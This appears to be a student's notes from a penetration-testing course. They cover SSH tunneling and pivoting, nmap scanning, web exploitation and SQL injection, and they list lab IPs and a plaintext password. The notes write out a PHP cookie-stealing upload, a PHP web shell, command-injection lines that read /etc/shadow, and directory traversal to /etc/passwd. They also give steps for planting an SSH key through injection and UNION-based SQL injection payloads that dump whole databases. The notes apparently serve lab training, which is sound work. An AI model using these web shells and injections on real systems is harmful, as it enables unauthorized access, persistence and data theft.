# Opstation details
  ## NIX_OPS
  10.50.171.189
  
  ## WIN_OPS
  10.50.171.194

  ## CTFD_SERVER
  ### 10.50.171.186:8000
  ---------------------------------
  ### Jump: 10.50.15.96
  ### USER: VERA-016-F-M
  ### PW: PVQiqIOpn7K4
  ### STACK#: 14

  ## For demonstrations
  1. ssh demo1@10.50.12.237 -L 1111:10.208.50.61:80 
  2. 127.0.0.1:1111/classinfo.html













  
# Day 1: Pen Testing | Exploitation Research | Recon & Scanning

## Pen Testing
  ### Phase 1: Mission
        -Scope of Mission
        -Determine valid targets (networks/machines)
        -Define RoE
  ### Phase 2: Recon
        -Public info gathering
        -DO NOT TOUCH THE TARGET
  ### Phase 3: Footprinting
        -Scan network/targets
  ### Phase 4: Exploitation/Initial Access
        -Gain it
  ### Phase 5: Post-exploitation
      -Persistence
      -Escalate priveleges
      -Obfuscate
      -Cover tracks
      -Exfiltrate target data
  ### Phase 6: Document/Report Mission

  

  ## Network Recon & Scanning
  
  ### Create Control Socket
  ssh -MS /tmp/jump student@10.50.15.96
   #### -M puts SSH into Master mode & multiplexing
   
   #### -S creates socket in specified directory
   #### Authenticate to jumpbox

  ### Ping Sweep 
  for i in {x..y}; do (ping -c 1 x.x.x.$i | grep "bytes from" &); done


  ### Set up Dyanmic port forward
  ssh -S /tmp/jump jump -O forward -D 9050

  ### Scan targets found 
  proxychains nmap <ip>

  ### Banner Grab open ports, Verify port services
  proxychains nc <ip> <port>
  !Press enter key just in case to get more info

  ### Set up local port forward to open port
  ssh -S /tmp/jump jump -O forward -L 1111:<tgt_ip>:<tgt_port> -L 1112:<tgt_ip>:<tgt_port>

  ### Use Firefox
  127.0.0.1:<localportforward>

#################################################################################################### 

  ### Create New Master Socket To New IP
  ssh -MS /tmp/t1 username@127.0.0.1 -p <localportyousetup>

  ### Thorugh recon found IP ex: 10.200.30.50, run a ping on jump box
  Ping from t1 box: ping <10.200.30.50> ## it is up

  ### Cancel dynamic port forward
  ssh -S /tmp/jump jump -O cancel -D 9050

  ### Set up port forwards on new master socket
  ssh -S /tmp/t1 t1 -O forward -D 9050

  ### Scan found target IP
  proxychains nmap <target ip> |
  verify open ports & services 

  ### Port forward to newly found ports 
  ssh -S /tmp/t1 t1 -O forward -L 2111:<tgtip>:<tgt port> -L 2112:<tgtip>:<tgtport>



## WEB SCRAPER- only change http & authors
  #!/usr/bin/env python
  

  import lxml.html
  import requests


  def main():


  page = requests.get('http://quotes.toscrape.com')
  tree = lxml.html.fromstring(page.content)


  authors = tree.xpath('//small[@class="author"]/text()')


  print ('Authors: ',authors)































# DAY 2: WEBEX D1

## Web Fundamentals

### HTTP 
  -HTTP methods: OPTIONS, GET, HEAD, POST, PUT, DELETE, TRACE, CONNECT
  -HTTP fields: Host, User-Agent, Referer, Accept-Language, Accept, Cookie, Content-Length
  
-----------------------------------
### JavaScript
  -Useful JavaScript components: Capturing Cookies | Capturing Keystrokes & Sensitive Data
  #### Demo: 
   ##### Getting Demo IP using methodology:
    -1. Demo IP: 10.50.13.128
    -2. Create Intial tunnel: ssh -MS /tmp/demo demo@10.50.13.128
    -Use scanning methods
    -3. Website IP found: 10.208.50.42
    -4. Create Dynamic tunnel for nmap: ssh -S /tmp/demo demo -O forward -D9050
    -5. Run nmap: proxychains nmao 10.208.50.42
    -6.Run nmap: proxychains nmap -sV --script=http-enum -p 80 10.208.50.42
    -7. Create local forward to Web server: ssh -S /tmp/demo demo -O forward -L12344:10.208.50.42:80
    -8. Access local port through firefox
  ##### What did we learn:
    - Find suspicious Java script function
    - Run functions in console that you find inspect code

--------------------------------------- 
### Cross-Site Scripting (XSS)
  -Types: Reflected vs. Stored
#### Stored XSS
  -Resides on vulnerable site
  ##### Command Injection | ADD SEMICOLON ; and then command
      -Run commands into areas of entry that arent meant for those commands.
      -Cmds:; cat /etc/shadow, whoami, uname -a
  
  ##### Directory Traversal
      -Find where an equal sign resides and add
      -Write ../../../../../etc/passwd
  
  #### Malicious File Upload
  ##### 1
      -<?php
      -$cookie = $_GET["username"];
      -$steal = fopen("/var/www/html/cookiefile.txt", "a+");
      -fwrite($steal, $cookie ."\n");
      -fclose($steal);i
      -?>
  #### 2
  
      -<HTML><BODY>
      -<FORM METHOD="GET" NAME="myform" ACTION="">
      -<INPUT TYPE="text" NAME="cmd">
      -<INPUT TYPE="submit" VALUE="Send">
      -</FORM>
      -<pre>
      -<?php
      -if($_GET['cmd']) {
      -system($_GET['cmd']);
      -}
      -?>
      -</pre>
      -</BODY></HTML>
      -1. Make sure the file gets uploaded
      

### SSH KEYGEN/UPLOAD - works with command injection to view home directory of current user - home dir here is /var/user
      -1. Make a directory to put my own key inside: ;mkdir /var/user/.ssh
      -2. See if the dir was made: ls /var/user
      -3. Run on own: ssh-keygen -t rsa -b 4096; hit enter 3 times after running it
      -4. Run on own: cat /home/student/.ssh/id_rsa.pub - COPY EVERYTHING THAT IS OUTPUTTED top to bottom
      -5. Run on web: ;echo "<output of number 4>" > /var/user/.ssh/authorized_keys
      -6. Verify key was made: ;ls -lisa /var/user/.ssh
      -7. Modify already made tunnel to hit the port 22 at end of -L
      -8. Run on own to query tunnel: ssh -i .ssh/id_rsa.pub user@127.0.0.1 -p RHP

















# DAY 3: WEBEX D2

## SQL (Injections) - AKA Structured Query Language
  - Create SQL queries
  - Perform SQL Injections through GET & POST http commands
  - INPUTTING is POST, SELECTING IS GET
### Standard SQL Commands
  - SELECT
  - UNION
  - Add single quote ' to find input fields

### SQL Credential/Authentication Bypass Dumping
     - 1. Local forward to SQL Server: ssh demo1@10.50.12.237 -L 1235:10.208.50.61:80
     - 2. Visit SQL page
     - 3. INPUT ( tom' OR 1='1 ) into user & pw fields -DONT LOGIN YET
     - 4. INSPECT. View network tab and NOW Login with creds while viewing network tab
     - 5. GET and POST should pop up: Click POST request, right hand side click request - check what we inputted
     - 6. Turn on Raw to turn POST into ONE line ( Called Request payload (should be one line)
     - 7. Copy string, add ? to URL to intialize variable and PASTE string into URL and press ENTER
      -8. Whatever the output, View Page Source

### SQL Inject Golden Rule Demo
     - 1. Golden Statement
       - table_schema,table_name,column_name from information_schema.columns
       - <NAME OF COLUMN>,<NAME OF COLUMN>,<NAME OF COLUMN> from <NAME OF DATABASE>,<NAME OF TABLE>

     - 2. Access SQL DBL
       -run: mysql
       
     - 3. Show databases - THREE DEFAULT DATABASES (information_schema, mysql, perfofrmance_schema)
       -run: show databases ;

     - 4. Run golden statement
       -run: select table_schema,table_name,column_name from information_schema.columns ;

     - 5. Manuever into infoschema DB
       -run: use information_schema  ;

     - 6. Output tables
       -run: show tables ;

     - 7. Output columns 
       -run: show columns from columns ;
       -Should now output table_schema, table_name, column_name

  #### SQL INJECTION  on website

     -1. Identify vulnerable field/selection
       -Use truth statement ( tom' OR 1='1 ) while replacing "tom" with the Selections given
       -Basically seeing what still works WHILE using selection names, what does not have input sanitization

     -2. Identify # of columns, utilize UNION SELECT
       - vulnerableselectionname' UNION SELECT 1,2,3,4 #
       - If didnt work, add another number
       - vulnerableselectionname' UNION SELECT 1,2,3,4,5 #

     -3. Edit Golden Statement- ONLY CHANGE: 2 = column we cant see, 5 = total amount of columns you can query ( IMPORTANT )
       - INPUT: vulnerableselectionname' UNION SELECT table_schema,2,table_name,column_name,5 from information_schema.columns #
       - MAKE SURE TO REPLACE THE ( 1,2,3,4,5 # ) in last command with GOLDEN STATEMENT
       - Should OUTPUT ENTIRE DATABASE
       - KEEP TRACK OF TABLE FOR CRAFTING QUERIES
       -Database            Table               Column

      -4. Craft our queries |  2 = column we cant see
       -vulnerableselectionname' UNION SELECT nameofcyouwant,2,nameofc,nameofc,nameofc from database.Table


      
